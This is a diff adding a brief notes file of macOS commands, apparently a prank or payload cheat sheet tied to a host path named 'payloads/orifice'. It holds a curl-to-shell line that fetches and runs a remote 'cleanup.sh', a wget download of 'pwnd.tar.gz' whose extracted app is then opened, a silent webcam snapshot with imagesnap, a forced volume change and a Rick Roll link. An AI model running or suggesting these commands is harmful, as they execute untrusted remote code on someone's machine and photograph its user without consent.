@@ -1,0 +1,17 @@
+cleanup script:
+sh -c "$(curl -fsSL http://mcp.gnerd.io/payloads/orifice/cleanup.sh)"
+
+photo stuff:
+brew install imagesnap
+imagesnap ~/Desktop/$(date +%y%m%d%H%M%S).png
+
+app exec:
+wget http://mcp.gnerd.io/payloads/orifice/pwnd.tar.gz
+tar -zxvf pwnd.tar.gz
+open Pwnd.app
+
+volume etc:
+osascript -e 'set volume 7'
+
+urls...
+rick: https://www.youtube.com/watch?v=dQw4w9WgXcQ
